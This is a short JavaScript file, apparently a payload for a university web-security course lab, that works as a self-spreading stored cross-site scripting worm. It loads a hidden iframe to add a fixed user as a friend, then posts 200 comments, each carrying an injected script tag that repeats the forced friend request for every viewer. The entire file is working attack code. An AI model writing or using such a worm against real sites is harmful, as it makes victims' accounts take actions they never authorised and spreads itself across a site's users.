    


//Auto add friend
var iframe = document.createElement('iframe');
iframe.style.display = "none";
iframe.src = "http://csec380-core.csec.rit.edu:86/add_friend.php?id=96";
document.body.appendChild(iframe);



//Add comment to spread add friend iframe, set i to 1k ah yeaaa
for (i = 0; i < 200; i++) { 
	var iframe1 = document.createElement('iframe');
	iframe1.style.display = "none";
	iframe1.src = "http://csec380-core.csec.rit.edu:86/add_comment.php?id=" +i+ "&comment=<script>var iframe = document.createElement('iframe');iframe.style.display = 'none';iframe.src = 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=96';document.body.appendChild(iframe);</script>";
	document.body.appendChild(iframe1);

};







